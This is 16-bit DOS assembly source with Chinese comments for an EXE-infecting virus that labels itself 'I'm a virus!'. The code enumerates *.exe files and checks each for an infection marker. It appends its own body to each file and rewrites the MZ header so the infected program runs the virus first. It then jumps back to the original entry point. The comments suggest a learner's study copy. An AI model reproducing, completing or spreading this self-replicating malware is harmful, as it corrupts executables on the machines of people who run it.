assume cs:code,ds:data
data segment

data ends
code segment
    start:    
              mov  ax,cs                       ;初始化
              mov  ds,ax

              call virus                       ;调用virus模块
    
              cmp  bp,0
              jnz  source
              mov  ah,4ch
              int  21h
    source:   
              mov  ax,4200h                    ;移动指针到文件头
              xor  cx,cx                       ;位移为0
              xor  dx,dx
              int  21h

              mov  ah,3fh                      ;读文件头
              mov  cx,30h                      ;读取的字节数
              lea  dx,[bp+offset head]
              mov  si,dx
              int  21h

              push cs                          ;跳转回原程序代码
              mov  ax,word ptr [si+02eh]       ;02e即原来的14-15
              push ax
              retf

virus proc
              call locate
    locate:   
              pop  bp                          ;call指令压入了locate的IP , bp=offset locate
              sub  bp,offset locate            ;bp=0
              lea  dx,[bp+offset string]       ;输出字符串
              mov  ah,09h
              int  21h
                                                ;DS:DX=磁盘缓冲区首址
              lea  dx,[bp+offset dta]          ;设置缓冲区dta
              mov  ah,1ah                      ;设置磁盘缓冲区DTA，，DS:DX=磁盘缓冲区首址
              int  21h

              lea  dx,[bp+offset filename]     ;查找第一个文件
              mov  cx,0                        ;cx:属性，
                                               ;值所匹配的文件类型
                                               ;00h 普通文件
                                                
              mov  ah,4eh                       ;*是任意匹配
                                                ;参数：DS:DX=带路径的文件名，CX=属性
                                                ;4e号功能,查找第一个匹配项
                                                ;dos中断4EH成功后，数据会写入到DTA（data transfer area）
              int  21h
              jc   Exit                        ;失败时CF=1，说明无匹配项直接结束

    modify:   
              lea  dx,[bp+offset dta]          ;匹配结果再磁盘缓冲区中
              add  dx,1eh                      ;DX是文件名
                                                ;DS:DX=带路径的文件名
              mov  ax,3d02h                    ;3d打开文件,02方式：读写
              int  21h                         ;CF=0成功,AX=文件号,CF=1失败,AX=错误码

              mov  bx,ax                       ;保存文件句柄到BX中
    
              mov  ax,4200h                    ;移动文件指针到文件头
                                                ;BX=文件号,CX:DX=移动的位移量
              xor  cx,cx
              xor  dx,dx
              int  21h

              mov  ah,3fh                      ;3F号功能,读文件头,内容存到head
                                                ;BX=文件号，CX=字节数
                                                ;DS:DX=数据缓冲区地址

              mov  cx,30h                      ;读取30字节

              lea  dx,[bp+offset head]         ;设置head
              mov  si,dx                       ;si=offset head
              int  21h

              cmp  word ptr [si],5a4dh         ;检查是否是exe,5a4d为文件的标识
              jnz  next_file
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!病毒标识，需要更改
              cmp  word ptr [si+2ah],8888h     ;检查是否已被感染
              je   next_file

              mov  word ptr [si+2ah],8888h

              mov  ax,word ptr [si+014h]       ;保存原程序入口;;表示14-15H: b.exe 被载入后 IP 的初值是
              mov  word ptr [si+02eh],ax       ;保存信息在head

              xor  cx,cx                       ;位移量清零
              xor  dx,dx
              mov  ax,4202h                    ;42号功能，AL=方式0-正向1-相对2-反向
                                                ;参数：BX=文件号,CX:DX=移动的位移量
                                                ;移动指针到文件尾，病毒代码插入到尾部
                                                ;返回：CF=0成功,DX:AX=新的文件指针
              int  21h
    ;--------------------------------------------------以下未看
              push ax                           ;存一下AA.exe文件末尾的位置
              sub  ax,200h
              mov  cx,ax
              mov  ax,[si+16h]                 ;16-17H:表示 b.exe 被载入后 CS 的相对偏移地址是

              mov  dx,10h
              mul  dx
              sub  cx,ax
              mov  word ptr [si+14h],cx        ;这里我是试出来病毒代码的内存地址的；修改ip指向，程序入口为病毒代码
              pop  ax
             
              lea  dx,[bp+offset start]        ;写入代码
              lea  cx,[bp+offset theend]
              sub  cx,dx
              mov  ah,40h                       ;40号功能，写文件或者设备
                                                ;参数:DS:DX=缓冲区首址, BX=文件号，CX=写入的字节数。
              int  21h

              mov  ax,4202h                    ;计算新文件长度,修改头
              xor  cx,cx
              xor  dx,dx
              int  21h

              mov  cx,200h
              div  cx
              inc  ax
              mov  word ptr [si+2],dx
              mov  word ptr [si+4],ax
    
              mov  ax,4200h                     ;42号功能，AL=方式0-正向1-相对2-反向
                                                ;返回：CF=0成功,DX:AX=新的文件指针
              xor  cx,cx                        ;位移为0
              xor  dx,dx
              int  21h

              mov  ah,40h                        ;将新的头文件写入
              mov  dx,si
              mov  cx,30h
              int  21h

    next_file:
              mov  ah,3eh                      ;关闭文件,参数：BX=文件号
              int  21h

              mov  ah,4fh                      ;查找下一个文件
                                                ;返回CF=1失败,AX=错误码
              int  21h
              jc   Exit
              jmp  modify

    Exit:     
              ret
virus endp
    filename  db   "*.exe",0                   ;文件名
    dta       db   02bh dup(0)                 ;磁盘缓冲区
    string    db   "I'm a virus!",13,10,'$'
    head      db   30h dup(0)                  ;读文件头,内容存到head
    theend:   
code ends
end start
